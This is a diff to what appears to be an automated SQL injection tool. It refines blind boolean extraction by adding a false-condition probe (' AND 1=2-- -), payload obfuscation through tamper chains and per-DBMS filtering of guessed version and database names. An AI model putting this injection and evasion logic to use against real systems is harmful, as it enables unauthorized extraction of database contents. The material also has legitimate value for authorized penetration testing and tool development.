@@ -159349,15 +159349,30 @@ class ExtractionOrchestrator:
             except Exception as _dns_e:
                 LOG.debug("[Orchestrator] DNS Tunnel: %s", _dns_e)
 
-        #  v21 Method 6f: Dictionary-Based Extraction 
+        #  v21 Method 6f: Dictionary-Based Extraction
         # Try common DBMS values before char-by-char extraction
         # BUG-TECHMAP-DEAD FIX: use _norm_tech so NV/WB/EX/ST/SO/HY→'B' are included.
-        if _norm_tech in {"B", "BH", "IN", "BT", "E"}:
+        # BUG-DICT-CDN-GATE FIX (CRITICAL, all 5 DBMSes): Dictionary match was running
+        # even when _bool_oracle_functional=False (CDN caching, gap=0.000 < 0.10).
+        # When CDN serves the same cached page for ALL SQL conditions, every dictionary
+        # probe returns _d_sim=1.000 vs baseline regardless of whether the candidate
+        # value is actually in the database. This causes the FIRST candidate in the
+        # dictionary to "match" spuriously — producing MySQL-version strings ('8.0.36')
+        # on PostgreSQL targets, 'mysql' as the database name on PostgreSQL, etc.
+        # Fix: gate Method 6f on _bool_oracle_functional (same gate already applied to
+        # Methods 3/4/5 at line ~158434). Dictionary matching uses the same boolean
+        # oracle mechanism and is equally broken when the oracle is non-functional.
+        if _norm_tech in {"B", "BH", "IN", "BT", "E"} and _bool_oracle_functional:
             try:
                 _dict_context = "version" if "version" in sql_query.lower() else \
                     "database" if "database" in sql_query.lower() else \
                     "user" if "user" in sql_query.lower() else "table"
-                _candidates = DictionaryExtractor.try_dictionary(None, _dict_context)
+                # BUG-DICT-DBMS-FILTER FIX (all 5 DBMSes): Pass dbms to filter candidates.
+                # Previously try_dictionary(None, context) returned ALL candidates including
+                # MySQL-specific versions ('8.0.36', '5.7.44') even when DBMS=PostgreSQL.
+                # The FIRST candidate that coincidentally gets sim>0.75 (CDN) is accepted,
+                # producing DBMS-mismatched extraction results that mislead the analyst.
+                _candidates = DictionaryExtractor.try_dictionary(None, _dict_context, dbms)
                 if _candidates:
                     # BUG-V150-METHOD6F-DICT-MISSING-OBFUSCATION FIX (MEDIUM, all 5 DBMSes):
                     # Each of the ≤15 dictionary-check probes was sent via _send_injected
@@ -159425,8 +159440,44 @@ class ExtractionOrchestrator:
                             _bl_norm = ResponseNormaliser.normalise(_bl_raw)
                             _d_sim = SimHasher.body_similarity(_bl_norm, _d_norm)
                             if _d_sim > 0.75:
-                                LOG.info(f"[Orchestrator] Dictionary match: '{_cand}' (sim={_d_sim:.3f})")
-                                return _cand
+                                # BUG-DICT-CDN-DIFF-VERIFY FIX (CRITICAL, all 5 DBMSes):
+                                # sim > 0.75 alone is insufficient when CDN caching is active.
+                                # CDN serves the same cached baseline for ALL probes including
+                                # both TRUE and FALSE SQL conditions → every candidate gets
+                                # _d_sim ≈ 1.000 → first candidate in list always "matches".
+                                # Fix: send a known-false probe (AND 1=2) and verify the oracle
+                                # is functional: false probe must produce a DIFFERENT response
+                                # from baseline (_d_false_sim < 0.70). If false probe also looks
+                                # like baseline (sim > 0.70), CDN caching is the cause and the
+                                # apparent "match" is a false positive.
+                                _dict_diff_ok = True  # assume oracle functional unless disproved
+                                try:
+                                    _dict_false_sql_raw = (_orch_det_tmpl.replace("[INFERENCE]", "1=2")
+                                                           if _orch_det_tmpl else "' AND 1=2-- -")
+                                    _dict_false_sql = apply_heavy_variation(
+                                        _dict_false_sql_raw, _m6f_req[0] + 1000, data_fmt=self.data_fmt)
+                                    _dict_false_fp = await _send_injected(
+                                        self.engine, self.method, self.url, self.data,
+                                        self.data_fmt, getattr(self.result, "param", ""),
+                                        self.original + _dict_false_sql, self.tamper_chain)
+                                    if _dict_false_fp and _validate_response(_dict_false_fp, allow_empty=True):
+                                        _d_false_norm = ResponseNormaliser.normalise(
+                                            _extract_body_safe(_dict_false_fp))
+                                        _d_false_sim = SimHasher.body_similarity(_bl_norm, _d_false_norm)
+                                        if _d_false_sim > 0.70:
+                                            # False-condition probe also looks like baseline —
+                                            # CDN caching or static page: not a real oracle match
+                                            LOG.debug(
+                                                "[Orchestrator] Dictionary candidate %r differential FAIL: "
+                                                "true_sim=%.3f false_sim=%.3f "
+                                                "(false probe same as baseline — CDN cache)",
+                                                _cand, _d_sim, _d_false_sim)
+                                            _dict_diff_ok = False
+                                except Exception:
+                                    pass  # differential check failure: trust the sim > 0.75 match
+                                if _dict_diff_ok:
+                                    LOG.info(f"[Orchestrator] Dictionary match: '{_cand}' (sim={_d_sim:.3f})")
+                                    return _cand
             except asyncio.CancelledError:
                 raise
             except Exception as _dict_e:
@@ -163185,9 +163236,62 @@ class DictionaryExtractor:
     }
 
     @classmethod
-    def try_dictionary(cls, oracle_fn, context: str = "version") -> Optional[str]:
+    def try_dictionary(cls, oracle_fn, context: str = "version", dbms: str = "") -> Optional[str]:
         """Try dictionary values using binary search on the dictionary."""
         values = cls.COMMON_VALUES.get(context, [])
+        # BUG-DICT-DBMS-FILTER FIX (CRITICAL, all 5 DBMSes): Filter candidates by
+        # detected DBMS so DBMS-specific values are not tried against the wrong DBMS.
+        # Root cause: without filtering, MySQL version strings like '8.0.36' appear as
+        # matches on PostgreSQL targets when CDN caching causes sim=1.000 for all probes.
+        # The filter is applied only for "version" and "database" contexts where DBMS
+        # determines valid values; "user" and "table" contexts are cross-DBMS generic.
+        if dbms and context == "version":
+            _mysql_pfx    = ("8.0.", "8.1.", "8.2.", "5.7.", "5.6.", "5.5.")
+            _mariadb_pfx  = ("10.11.", "10.10.", "10.6.", "10.5.", "10.4.", "10.3.")
+            _pg_pfx       = ("15.", "14.", "13.", "12.", "11.", "10.", "9.")
+            _mssql_pfx    = ("16.", "15.", "14.", "13.", "12.", "11.", "10.")
+            _oracle_vals  = {"19c", "21c", "23c", "12c", "11g"}
+            _sqlite_pfx   = ("3.",)
+            _dbms_filter_map = {
+                "MySQL":          lambda v: any(v.startswith(p) for p in _mysql_pfx),
+                "MariaDB":        lambda v: any(v.startswith(p) for p in _mariadb_pfx),
+                "PostgreSQL":     lambda v: any(v.startswith(p) for p in _pg_pfx),
+                "CockroachDB":    lambda v: any(v.startswith(p) for p in _pg_pfx),
+                "YugabyteDB":     lambda v: any(v.startswith(p) for p in _pg_pfx),
+                "Amazon Redshift":lambda v: any(v.startswith(p) for p in _pg_pfx),
+                "MSSQL":          lambda v: any(v.startswith(p) for p in _mssql_pfx),
+                "MSSQLServer":    lambda v: any(v.startswith(p) for p in _mssql_pfx),
+                "SQLServer":      lambda v: any(v.startswith(p) for p in _mssql_pfx),
+                "Oracle":         lambda v: v in _oracle_vals,
+                "SQLite":         lambda v: any(v.startswith(p) for p in _sqlite_pfx),
+                "TiDB":           lambda v: any(v.startswith(p) for p in _mysql_pfx),
+            }
+            _filt = _dbms_filter_map.get(dbms)
+            if _filt:
+                values = [v for v in values if _filt(v)]
+        elif dbms and context == "database":
+            # Filter database names to DBMS-appropriate system databases only
+            _db_filter_map = {
+                "MySQL":       {"mysql", "information_schema", "performance_schema", "test"},
+                "MariaDB":     {"mysql", "information_schema", "performance_schema"},
+                "PostgreSQL":  {"postgres", "template1", "template0"},
+                "CockroachDB": {"postgres", "defaultdb", "system"},
+                "YugabyteDB":  {"postgres", "yugabyte"},
+                "MSSQL":       {"master", "tempdb", "msdb", "model"},
+                "MSSQLServer": {"master", "tempdb", "msdb", "model"},
+                "SQLServer":   {"master", "tempdb", "msdb", "model"},
+                "Oracle":      {"orcl", "xe", "xe", "pdb"},
+                "SQLite":      {"main", ":memory:"},
+            }
+            # Only filter system dbs; keep generic app dbs (production, app, etc.)
+            _sys_dbs = _db_filter_map.get(dbms, set())
+            if _sys_dbs:
+                _generic_app = [v for v in values if v not in {
+                    "mysql", "information_schema", "performance_schema",
+                    "postgres", "template1", "master", "tempdb", "msdb",
+                }]
+                _dbms_sys = [v for v in values if v in _sys_dbs]
+                values = _dbms_sys + _generic_app  # DBMS-specific system dbs first
         # Can't do async in classmethod easily, return candidates instead
         return values
 
